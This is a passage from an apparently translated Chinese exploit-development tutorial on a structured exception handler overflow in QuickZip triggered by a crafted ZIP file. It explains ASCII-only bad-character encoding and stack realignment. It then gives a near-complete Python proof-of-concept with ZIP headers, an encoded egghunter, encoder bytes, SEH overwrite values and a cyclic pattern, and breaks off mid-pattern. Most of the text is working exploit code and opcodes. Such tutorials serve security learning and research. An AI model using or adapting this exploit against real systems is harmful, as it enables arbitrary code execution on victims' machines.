style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">首先，我们需要调整堆栈才能写入我们控制的内存区域。 通过观察ESP的值和我们目前的位置（上面的截图），可以发现，我们需要将ESP偏移0x62C（0x0018FB58（EIP的值）减去0x0018F528（ESP的值）再减去0x4（用于填充的空字节））。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这可以通过以下指令来实现：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">push&nbsp;esp;
+pop&nbsp;eax;
+add&nbsp;eax,&nbsp;0x62C;
+push&nbsp;eax;
+pop&nbsp;esp;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">上述指令的相应操作码如下所示：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">&quot;\x54&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;push&nbsp;esp;
+&quot;\x58&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;pop&nbsp;eax;
+&quot;\x05\x2c\x06\x00\x00&quot;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x62C
+&quot;\x50&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;push&nbsp;eax;
+&quot;\x5c&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;pop&nbsp;esp;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">但是，这里有一个问题—— “\ x05 \ x2c \ x06 \ x00 \ x00”有两个NULL字节，这将破坏我们的漏洞利用代码。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然而，我们可以通过使用有效字符执行几次ADD和SUB指令来设置成我们想要的值，例如，&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">\x05\x2d\x07\x01\x01&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x0101072D
+\x2d\x01\x01\x01\x01&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;sub&nbsp;eax,&nbsp;0x01010101
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;total:&nbsp;&nbsp;&nbsp;0x00000630</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">瞧！我们可以使用有效的字符来实现同样的事情。下面我们来更新漏洞利用代码，看看会发生什么。</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t01f9f43084719ce644.png" title="t01510b9a0776de5299.png" alt="http://p0.qhimg.com/t01510b9a0776de5299.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">太棒了，我们的有效载荷完全与堆栈可以完美搭配了，下面开始编写我们的编码器。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">注意：由于pop esp指令（\ x5c）的缘故，ZIP文件的内容看起来会有点不同。 \ x5c表示一个反斜杠，由QuickZip解释为一个文件夹...这可能在以后有一些影响，但现在没什么。</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t01ae6259c90982182c.png" title="t018613fb886759b236.png" alt="http://p4.qhimg.com/t018613fb886759b236.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">现在，我们需要做的最后一件事是写一组指令，将egghunter的起始地址放入EAX并跳转到它。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">为了避免“坏”字符，我们将在EAX寄存器中设置我们需要的操作码的值，并将其压入我们调整的堆栈上。这样，我们需要的指令将写到我们控制的内存区域中。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">下面用一个例子来解释。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">让我们从实际想要写的指令开始吧：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:php;toolbar:false">push&nbsp;esp;
+pop&nbsp;eax;
+sub&nbsp;eax,&nbsp;0xDEADBEEF
+jmp&nbsp;eax;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">很简单——将ESP压入堆栈中，将其弹出到EAX中，通过一定的值将其调整到egghunter中（我们不知道确切的值，因此现在的占位符为0xDEADBEEF），并跳转到EAX的调整地址。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">下面生成我们需要的字节：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">metasm&nbsp;&gt;&nbsp;push&nbsp;esp
+&quot;\x54&quot;
+metasm&nbsp;&gt;&nbsp;pop&nbsp;eax
+&quot;\x58&quot;
+metasm&nbsp;&gt;&nbsp;sub&nbsp;eax,&nbsp;0xDEADBEEF
+&quot;\x2d\xef\xbe\xad\xde&quot;
+metasm&nbsp;&gt;&nbsp;jmp&nbsp;eax
+&quot;\xff\xe0&quot;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">把它们写成4个一组：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">\x54\x58\x2d\xef
+\xbe\xad\xde\xff
+\xe0\x90\x90\x90</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">因为我们一次写4个字节，所以我们需要在末尾填充3个nops（\ x90）（把要写入的字节的总长度设为12）。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">现在，让我们从右下角开始写字节（因为endianness的缘故）——这将指出我们实际需要压入堆栈的值。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">\x90\x90\x90\xe0
+\xff\xde\xad\xbe
+\xef\x2d\x58\x54</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">记住，我们只能使用ASCII值，这意味着可以使用几乎任何01到7f字节的组合来进行计算。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">让我们用一个对利用代码比较友好的指令，将第一组字节写入eax：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;zero&nbsp;out&nbsp;EAX
+&quot;\x25\x10\x10\x10\x10&quot;&nbsp;&nbsp;#&nbsp;and&nbsp;eax,0x10101010
+&quot;\x25\x01\x01\x01\x01&quot;&nbsp;&nbsp;#&nbsp;and&nbsp;eax,0x01010101
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;write&nbsp;0x909090e0&nbsp;into&nbsp;EAX
+&quot;\x05\x70\x70\x70\x70&quot;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x70707070
+&quot;\x05\x70\x20\x20\x20&quot;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x20202070
+&quot;\x50&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;push&nbsp;eax;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">我们来更新漏洞利用代码并运行它。</span></p><p style="text-align:center"><img src="http://p2.qhimg.com/t0129090efecb036ab1.png" title="t013c98f011df0496a4.png" alt="http://p5.qhimg.com/t013c98f011df0496a4.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">太棒了，我们已经在EAX中成功设定了我们需要的值，并把它压入堆栈上，实际上写的是我们需要的指令！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">让我们对所有剩余的字节做同样的处理。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">完成上述处理后，新的PoC应该如下所示：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">#!/usr/bin/python
+header_1&nbsp;=&nbsp;(&quot;\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00&quot;
+&quot;\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00&quot;)
+header_2&nbsp;=&nbsp;(&quot;\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00&quot;
+&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00&quot;
+&quot;\x24\x00\x00\x00\x00\x00\x00\x00&quot;)
+header_3&nbsp;=&nbsp;(&quot;\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00&quot;
+&quot;\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00&quot;)
+print&nbsp;&quot;[+]&nbsp;Building&nbsp;PoC..&quot;
+max_size&nbsp;=&nbsp;4064
+nseh_offset&nbsp;=&nbsp;292
+jump_offset&nbsp;=&nbsp;92
+#&nbsp;msfencode&nbsp;-e&nbsp;x86/alpha_mixed&nbsp;bufferregister=eax&nbsp;-i&nbsp;egghunter-wow64.bin
+#&nbsp;[*]&nbsp;x86/alpha_mixed&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;146&nbsp;(iteration=1)
+egghunter&nbsp;=&nbsp;(&quot;\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49&quot;
+&quot;\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30&quot;
+&quot;\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42&quot;
+&quot;\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x66\x51\x49\x4b&quot;
+&quot;\x52\x73\x53\x63\x62\x73\x36\x33\x4e\x53\x6f\x30\x75\x36&quot;
+&quot;\x6d\x51\x59\x5a\x49\x6f\x36\x6f\x72\x62\x71\x42\x42\x4a&quot;
+&quot;\x66\x46\x56\x38\x74\x73\x78\x49\x4c\x4b\x4b\x64\x61\x74&quot;
+&quot;\x49\x6f\x47\x63\x31\x4e\x50\x5a\x77\x4c\x77\x75\x53\x44&quot;
+&quot;\x49\x79\x38\x38\x52\x57\x36\x50\x50\x30\x33\x44\x6c\x4b&quot;
+&quot;\x59\x6a\x4e\x4f\x32\x55\x38\x64\x4e\x4f\x70\x75\x6b\x51&quot;
+&quot;\x6b\x4f\x79\x77\x41\x41&quot;)
+payload&nbsp;=&nbsp;egghunter
+payload&nbsp;+=&nbsp;&quot;A&quot;&nbsp;*&nbsp;(nseh_offset&nbsp;-&nbsp;len(payload)&nbsp;-&nbsp;jump_offset)&nbsp;&nbsp;&nbsp;#&nbsp;padding&nbsp;for&nbsp;nSEH
+#&nbsp;Offset&nbsp;the&nbsp;stack&nbsp;by&nbsp;0x62C&nbsp;to&nbsp;start&nbsp;writing&nbsp;to&nbsp;a&nbsp;controlled&nbsp;area&nbsp;of&nbsp;memory
+#
+payload&nbsp;+=&nbsp;&quot;\x54&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;push&nbsp;esp;
+payload&nbsp;+=&nbsp;&quot;\x58&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;pop&nbsp;eax;
+payload&nbsp;+=&nbsp;&quot;\x05\x2d\x07\x01\x01&quot;&nbsp;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x0101072D
+payload&nbsp;+=&nbsp;&quot;\x2d\x01\x01\x01\x01&quot;&nbsp;&nbsp;&nbsp;#&nbsp;sub&nbsp;eax,&nbsp;0x01010101
+payload&nbsp;+=&nbsp;&quot;\x50&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;push&nbsp;eax;
+payload&nbsp;+=&nbsp;&quot;\x5c&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;pop&nbsp;esp;
+#&nbsp;Write&nbsp;instructions&nbsp;for:&nbsp;push&nbsp;esp;&nbsp;pop&nbsp;eax;&nbsp;sub&nbsp;eax,&nbsp;0xDEADBEEF;&nbsp;jmp&nbsp;eax
+#
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Zero-out&nbsp;EAX
+payload&nbsp;+=&nbsp;&quot;\x25\x01\x01\x01\x01&quot;&nbsp;&nbsp;&nbsp;#&nbsp;and&nbsp;eax,0x01010101
+payload&nbsp;+=&nbsp;&quot;\x25\x10\x10\x10\x10&quot;&nbsp;&nbsp;&nbsp;#&nbsp;and&nbsp;eax,0x10101010
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;write&nbsp;0x909090e0&nbsp;into&nbsp;EAX
+payload&nbsp;+=&nbsp;&quot;\x05\x70\x70\x70\x70&quot;&nbsp;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x70707070
+payload&nbsp;+=&nbsp;&quot;\x05\x70\x20\x20\x20&quot;&nbsp;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x20202070
+payload&nbsp;+=&nbsp;&quot;\x50&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;push&nbsp;eax;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Zero-out&nbsp;EAX
+payload&nbsp;+=&nbsp;&quot;\x25\x01\x01\x01\x01&quot;&nbsp;&nbsp;&nbsp;#&nbsp;and&nbsp;eax,0x01010101
+payload&nbsp;+=&nbsp;&quot;\x25\x10\x10\x10\x10&quot;&nbsp;&nbsp;&nbsp;#&nbsp;and&nbsp;eax,0x10101010
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;write&nbsp;0xffdeadbe&nbsp;into&nbsp;EAX
+payload&nbsp;+=&nbsp;&quot;\x05\x77\x77\x77\x77&quot;&nbsp;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x77777777
+payload&nbsp;+=&nbsp;&quot;\x05\x37\x25\x57\x77&quot;&nbsp;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x77572537
+payload&nbsp;+=&nbsp;&quot;\x05\x10\x11\x10\x11&quot;&nbsp;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x11101110
+payload&nbsp;+=&nbsp;&quot;\x50&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;push&nbsp;eax;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Zero-out&nbsp;EAX
+payload&nbsp;+=&nbsp;&quot;\x25\x01\x01\x01\x01&quot;&nbsp;&nbsp;&nbsp;#&nbsp;and&nbsp;eax,0x01010101
+payload&nbsp;+=&nbsp;&quot;\x25\x10\x10\x10\x10&quot;&nbsp;&nbsp;&nbsp;#&nbsp;and&nbsp;eax,0x10101010
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;write&nbsp;0xef2d5854&nbsp;into&nbsp;EAX
+payload&nbsp;+=&nbsp;&quot;\x05\x43\x47\x1c\x77&quot;&nbsp;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x771c4743
+payload&nbsp;+=&nbsp;&quot;\x05\x10\x10\x01\x77&quot;&nbsp;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x77011010
+payload&nbsp;+=&nbsp;&quot;\x05\x01\x01\x10\x01&quot;&nbsp;&nbsp;&nbsp;#&nbsp;add&nbsp;eax,&nbsp;0x01100101
+payload&nbsp;+=&nbsp;&quot;\x50&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;push&nbsp;eax;
+payload&nbsp;+=&nbsp;&quot;A&quot;&nbsp;*&nbsp;(nseh_offset&nbsp;-&nbsp;len(payload))&nbsp;&nbsp;&nbsp;#&nbsp;padding&nbsp;for&nbsp;the&nbsp;rest&nbsp;of&nbsp;encoder
+payload&nbsp;+=&nbsp;&quot;\x71\x9b\x70\x9b&quot;&nbsp;&nbsp;&nbsp;#&nbsp;nSEH:&nbsp;jno&nbsp;$-99;&nbsp;jo&nbsp;$-99&nbsp;&nbsp;&nbsp;=&gt;&nbsp;&#39;9b&#39;&nbsp;will&nbsp;actually&nbsp;be&nbsp;converted&nbsp;to&nbsp;&#39;a2&#39;,&nbsp;which&nbsp;is&nbsp;$-92
+payload&nbsp;+=&nbsp;&quot;\x33\x28\x42\x00&quot;&nbsp;&nbsp;&nbsp;#&nbsp;SEH
+payload&nbsp;+=&nbsp;&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1D